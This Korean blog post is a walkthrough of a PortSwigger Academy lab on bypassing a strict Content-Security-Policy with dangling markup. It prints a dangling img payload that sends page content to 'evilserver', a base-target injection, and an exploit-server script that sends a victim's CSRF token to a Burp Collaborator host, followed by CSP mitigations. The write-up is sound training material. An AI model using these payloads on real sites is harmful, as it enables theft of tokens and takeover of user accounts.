---
layout: post
title: "Burp Academy-XSS 취약점: Reflected XSS protected by very strict CSP, with dangling markup attack"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XSS취약점]
toc: true
last_modified_at: 2025-04-16 21:30:00 +0900
---

# 개요
- 취약점 설명 주소: https://portswigger.net/web-security/cross-site-scripting/content-security-policy
- 랩 주소: https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack
- PortSwigger Research(Dom-based dangling markup으로 CSP 우회하기): https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup
- 난이도: EXPERT (어려움)


# CSP(콘텐츠 보안 정책)란??
CSP는 XSS 및 기타 공격을 완화하기 위한 브라우저 보안 메커니즘이다. 페이지가 로드할 수 있는 리소스(예: 스크립트 및 이미지)를 제한하고, ㅇ페이지가 다른 페이지에 의해 frame으로 표시될 수 있는지 여부를 제한하는 방식으로 작동한다.

CSP를 활성화하려면 HTTP 응답 헤더에 `Content-Security-Policy` 정책을 포함해야 한다. 정책 자체는 세미콜론으로 구분된 하나 이상의 지시어로 구성된다. 

# CSP를 사용하여 XSS 공격 완화하기 
다음 지시어는 스크립트가 페이지 자체와 동일한 출처 에서만 로드되도록 허용한다.

```
script-src 'self'
```

다음 지시어는 특정 도메인에서만 스크립트를 로드하도록 허용한다. 

```
script-src https://scripts.normal-website.com
```

외부 도메인의 스크립트를 허용할 때는 주의해야 한다. 공격자가 외부 도메인에서 제공되는 콘텐츠를 제어할 수 있는 방법이 있다면 공격할 수 있기 때문이다. 예를 들어, 고객별로 다른 URL을 사용하지 않는 콘텐츠 전송 네트워크(CDN)(예: `ajax.googleapis.com`)는 제3자가 해당 도메인으로 콘텐츠를 전송할 수 있으므로 신뢰할 수 없다.

특정 도메인을 화이트리스트에 추가하는 것 외에도 CSP는 신뢰할 수 있는 리소스를 지정하는 두 가지 다른 방법(nonce 및 해시)도 제공한다. 

- CSP 지시문은 nonce(랜덤값)를 지정할 수 있으며, 스크립트를 로드하는 태그에도 동일한 값을 사용해야 한다. 값이 일치하지 않으면 스크립트가 실행되지 않는다. 제어 기능을 효과적으로 사용하려면 nonce가 각 페이지 로드 시 안전하게 생성되어야 하며 공격자가 추측할 수 없어야 한다. 
- CSP 지시문은 신뢰할 수 있는 스크립트 내용의 해시값을 지정할 수 있다. 스크립트의 해시값이 지시문에 지정된 값과 일치하지 않으면 스크립트가 실행되지 않는다. 스크립트 내용이 변경되는 경우, 지시문에 지정된 해시값을 업데이트해야 한다. 

CSP가 `script` 와 같은 리소스를 차단하는 것은 흔한 일이다. 하지만 많은 CSP가 이미지 요청은 허용한다. 이 것은 해커가 CSRF 토큰을 노출시키기 위해 `img` 요소를 사용해서 외부의 서버에 요청이 가능해지는 리스크도 있다. 

Chrome 등 일부 브라우저에는 내장된 댕글링 마크업 완화 기능이 있다. 이는 raw, 인코딩되지 않은 줄 바꿈이나 꺾쇠 괄호와 같은 특정 문자가 포함된 요청을 차단한다. 

일부 CSP 정책은 더욱 제한적이며 모든 형태의 외부 요청을 차단한다. 하지만 사용자 상호작용을 유도하여 이러한 제한을 우회 할 수도 있다. 이러한 정책을 우회하려면 특별한 HTML 엘레먼트를 삽입해야 한다. 이 요소에는 클릭하면 삽입된 요소에 포함된 모든 내용이 저장되어 외부 서버로 전송되도록 하는 코드가 포함된다. 


# 댕글링 마크업으로 중요정보 훔치기 

[댕글링 마크업](https://lcamtuf.coredump.cx/postxss/)은, script 태그 없이, image와 같은 리소스를 이용해서 사이트의 컨텐츠를 공격자의 서버로 전송시켜 내용을 훔치는 테크닉이다. 이는 (HTML 삽입이 가능하지만) 반사형XSS가 통하지 않거나 CSP헤더에 의해서 블록되었을 경우 유용할 수 있다. 

예를 들면 다음과 같은 상황을 생각해보자. 'INJECTION HERE' 부분에 HTML을 삽입할 수 있다. (웹사이트의 방어 메카니즘으로 script등은 사용할 수 없다.)

```html
INJECTION HERE <b>test</b>
<script>
token = 'supersecret';
</script>
<form action="blah"></form>
```

여기에서 다음과 같은 댕글링 이미지 태그를 삽입한다고 해보자. 

```html
<img src="https://evilserver/?
```

삽입된 후에는 다음과 같이 될 것이다. 쌍따옴표가 닫히지 않았으므로, script태그 부분이 src속성이 값으로 인식된다. src에 지정된 해커의 서버에 script태그에 포함된 중요정보가 URL의 쿼리 파라메터로 지정되어 전송되게 된다! 중요정보는 CSRF 토큰과 같은 것이 될 수도 있다.

```html
<img src="https://evilserver/?<b>test</b>
<script>
token = 'supersecret';
</script>
<form action="blah"></form>
```

# 댕글링 마크업을 사용해서 CSP 우회하기

CSP는 외부의 리소스 로드를 차단함으로써 위에서 설명한 댕글링 마크업 테크닉을 방어한다. 그러나 다음과 같은 정말 엄격한 CSP 헤더를 설정한 사이트여도 우회가 가능한 경우가 있다. 

```
default-src 'none'; base-uri 'none';
```

위 CSP는 댕글링 마크업에서 소개했던 것 같은 image 공격 벡터를 차단한다. 정책이 이미지 리소스나 다른 하위 리소스를 로드하지 않기 때문이다. **그러나 base 태그를 사용해서 이 제한을 우회할 수 있다.** base태그에 target 속성을 지정함으로써 페이지의 모든 링크에 적용되는 window의 이름을 변경할 수 있다. 불완전한 target 속성 값을 삽입함으로써, 삽입 후의 window 이름이 모두 변경된다. 불완전한 target 속성을 삽입하면 삽입 후 페이지의 모든 링크에 있는 상응되는(coresspoding) 따옴표까지 모든 마크업이 변경된 창 이름으로 설정되므로, 삽입 지점과 다음 따옴표 사이에 있는 토큰 등을 훔칠 수 있다. 

공격자가 피해자의 데이터를 훔치려면, 피해자가 링크를 클릭하기만 하면 된다. 예를 들면 아래와 같다. window 이름은 크로스 도메인을 통해 공격자에게 노출되므로 공격자는 window.name 속성을 읽기만 하면 된다. 

```html
<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="blah
```

`<base target="blah` 가 중요한 부분이다. target 속성은 여전히 ​​열려 있고, 페이지 마크업은 남은 이름으로 사용되며, 공격자는 윈도우 이름만 읽으면 된다. 공격자는 다음과 같은 코드를 사용할 것이다. 

```html
<script>alert("The extracted content is:" + name);</script>
```

## 방어
base 태그 삽입에 대한 방어책으로 다음과 같이 자신의 base 태그를 웹 페이지의 HTML 삽입 포인트 이전에 넣어두는 것이 있다. 이는 다음에 등장한 base태그가 target속성을 덮어쓰는 것을 막아준다.

```html
<base target="_self" />
```

## base태그 없이 DOM-based 댕글링 마크업 사용하기
(추후기술)

# 추기: 댕글링(Dangling)에 대해
영단어 dangle 는 '매달리다', '달랑거리다' 라는 뜻이다. 이미지는 똑바로 고정되어 있지 않고 느슨하게 매달려 있어서 바람이 불면 이리저리 흔들리는 것이다. 때문에 위태로운 상태로 볼 수 있다. IT쪽에서는 주로 설정이 값의 짝이 맞지 않는 상태를 댕글링이라고 부르는 것 같다. '절름발이' 이미지랑도 비슷하다고 이해하고 있다.

다음과 같은 경우에 쓰인다. 

1. 댕글링 마크업: HTML 태그(엘레먼트)에서 닫힌 꺽쇠(>)가 없는 경우
2. 댕글링 DNS 레코드(lame delegation): DNS 위임 정보를 관리하는 부모 자식 서버 간에 불일치가 발생한 경우
3. 댕글링 포인터: C/C++등에서 포인터가 해제된 메모리(유효하지 않은 메모리) 영역을 가리키고 있는 경우

딱히 이에 매칭되는 한글단어가 없어보이므로 그냥 댕글링으로 표시한다. 

# 랩 설명
이 랩에서는 외부 웹 사이트로 나가는 요청을 차단하는 엄격한 CSP를 사용한다. 

랩을 풀려면 먼저 Burp Collaborator를 사용하여 CSP를 우회하고 시뮬레이션된 피해자 사용자의 CSRF 토큰을 유출하는 XSS 공격을 수행한다. 그런 다음 시뮬레이션된 사용자의 이메일 주소를 `hacker@evil-user.net` 으로 변경하면 된다.

시뮬레이션된 사용자가 벡터를 클릭하도록 유도하려면 벡터에 "Click"이라는 단어를 표시해야 한다. 

`wiener:peter` 크레덴셜로 로그인할 수 있다. 

```
This lab using a strict CSP that blocks outgoing requests to external web sites.

To solve the lab, first perform a cross-site scripting attack that bypasses the CSP and exfiltrates a simulated victim user's CSRF token using Burp Collaborator. You then need to change the simulated user's email address to hacker@evil-user.net.

You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:

<a href="">Click me</a>
You can log in to your own account using the following credentials: wiener:peter
```

# 도전 
1. 일단 살펴본다. 기본적으로 응답헤더가 다음과 같다. CSP헤더가 설정되어 있다. 스크립트 및 오브젝트, 스타일시트, 이미지는 웹 사이트 자신으로부터 얻은 것(Same Origin)만 허용하게 되어 있다. 상당히 강력한 CSP헤더다. 

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';

```


2. 공격이 가능한 포인트를 찾아본다. GET /my-account 엔드포인트의 email파라메터에 XSS 페이로드 `"/><script>alert(1);</script>` 를 설정해서 요청을 보내보면 이스케이프 되지 않고 HTTP응답 페이지에 출력되는 것을 볼 수 있다. 공격이 가능해보인다. 

![](/images/burp-academy-xss-30-1.png)

![](/images/burp-academy-xss-30-2.png)


3. 그런데 웹 페이지가 브라우저에 의해 로드되면, alert창이 뜨지 않는 것을 알 수 있다. 브라우저의 콘솔창의 메세지를 보면 이유를 알 수 있다. Chrome의 에러 메세지는 다음과 같다. CSP 헤더에 설정된 룰 `"script-src 'self'` 을 위반했기 때문에 실행을 막았다는 것이다. `"script-src 'self'`는 동일 출처(Same Origin)에서 제공되는 스크립트만 실행을 허용한다는 의미를 가진다. 예를들면 `<script src="/resources/js/test.js"></script>` 와 같이 HTML페이지에 별도의 javascript파일로 포함된 스크립트를 허용한다. HTML페이지 내에 직접 쓰여진 스크립트(인라인 스크립트라고 부른다)는 허용되지 않는다. 반사형 XSS공격으로 실행되는 위치가 인라인 스크립트인 경우가 많기 때문이다. 인라인 스크립트의 실행을 허용하려면 CSP 헤더에 'unsafe-inline'을 추가하거나 (권장되지 않는 방법이다),  hash 또는 nonce를 적용해야 한다. 그러나 CSP헤더에는 어느 것도 설정되어 있기 않기 때문에 허용되지 않은 것을 알 수 있다. 

```
my-account:54 Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-5jFwrAK0UV47oFbVg/iCCBbxD8X1w+QvoOUepu4C2YA='), or a nonce ('nonce-...') is required to enable inline execution.
```

![](/images/burp-academy-xss-30-3.png)

4. CSP 헤더를 우회하는 방법을 생각해야 한다. exploit 서버를 다음과 같이 구성한다. 

```html
<script>
if(window.name) {
    new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
} else {
    location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```

exploit 분석 

이 코드가 exploit서버에서 로딩되면, window.name이 있는지 체크한다. 
1) window.name이 있으면 새로운 이미지를 만들고, src속성을 Burp Collaborator의 URL 및 window.name 으로 지정한다. (window.name에는 중요정보가 포함되어 있다.)

2) window.name이 없으면 랩서버의 XSS 취약점이 있는 곳에 지정된 페이로드를 삽입한다. 


페이로드 분석

랩 서버의 XSS취약점이 있는 곳인 email 파라메터에 삽입되는 페이로드를 살펴본다. 디코딩해서 보면 다음과 같이 생겼다. 

```html
"><a href="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</a><base target='
```
- 앵커태그의 href에 exploit서버를 지정하였다. 
- 앵커태그 뒤에 '댕글링 마크업' 테크닉으로 열린 base태그 및 target속성, 그리고 열린 따옴표가 있다. 이 페이로드가 랩 서버에 삽입되면, 다음과 같은 형태가 될 것이다. base 태그의 target 값에 csrf토큰을 포함한 히든 인풋 부분이 포함된 것을 알 수 있다. (열린 따옴표를 썼으므로, 닫는 따옴표가 등장할 때까지가 taget속성의 값이 된다.) 또한, base태그를 썼기 때문에 모든 태그의 target속성의 값이 base태그에 설정된 target속성 값으로 덮어쓰여 진다. target속성 값은 exploit서버에서 javascript로 window.name 으로 접근해서 얻어낼 수 있다. 


```html 
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value=""><a href="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</a><base target='">
    <input required type="hidden" name="csrf" value="cbDL5fqgd4OhsKFL0QNppM7WrNomqy5T">
    <button class='button' type='submit'> Update email </button>
</form>
```

![](/images/burp-academy-xss-30-4.png)


5. 실제 값을 넣어서 exploit 을 준비한다. 

```html
<script>
if(window.name) {
    new Image().src='//em4vfgeowcnct66zgv2o3nbfl6rxfo3d.oastify.com?'+encodeURIComponent(window.name);
} else {
    location = 'https://0a2d00180490d87480e903bb008700ba.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0a16007004dad8fa802102cb013600f5.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```

6. 저장 후에 Deliver exploit to victim을 클릭한다. 

![](/images/burp-academy-xss-30-5.png)

7. Burp Collaborator 탭을 보면 아무런 요청이 없는 것을 알 수 있다. 방화벽에 막혔는지도 모른다. 다른 네트워크에서 시도해보자. 



# 방어: CSP를 사용하여 댕글링 마크업 공격 완화하기 
다음 지시어는 페이지 자체와 동일한 출처에서만 이미지를 로드하도록 허용한다.

```
img-src 'self'
```

다음 지시어는 특정 도메인에서만 이미지를 로드하도록 허용한다..

```
img-src https://images.normal-website.com
```

이러한 정책은 일부 댕글링 마크업 악용을 방지한다. 유저 상호 작용 없이 데이터를 수집하는 가장 쉬운 방법은 `img`태그를 사용하는 것이기 때문이다. 하지만 `href`속성을 가진 댕글링 앵커 태그를 삽입하는 것과 같은 다른 악용은 방지할 수 없다.